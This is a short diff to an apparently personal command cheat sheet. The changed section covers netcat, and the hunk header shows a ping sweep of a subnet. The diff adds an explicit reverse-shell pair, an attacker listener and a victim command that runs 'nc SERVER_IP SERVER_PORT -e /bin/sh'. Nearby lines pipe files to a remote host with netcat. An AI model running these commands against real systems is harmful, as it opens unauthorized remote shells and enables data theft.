@@ -192,9 +192,10 @@ subnet='46.175.145'; for i in {0..255}; do timeout 0.5 ping -c1 $subnet.$i; done
 
 ### send nc/netcat/croc etc
 
+- use GNU or OpenBSD version of `nc` (not libressl)
 - `nc` reverse shell
-  - `exec command 2>&1 | nc SERVER_IP SERVER_PORT`
-  - `nc -l -p SERVER_PORT 2>&1 | tee -a FILE_NAME?`
+  - attacker listens `nc -vlp SERVER_PORT 2>&1 | tee -a console.log`
+  - victim sends `nc SERVER_IP SERVER_PORT -e /bin/sh`
 - [`nc` send file](https://superuser.com/a/98323)
   - `cat FILE_NAME | netcat SERVER_IP SERVER_PORT`
   - `nc -l -p SERVER_PORT -q 1 > FILE_NAME < /dev/null`
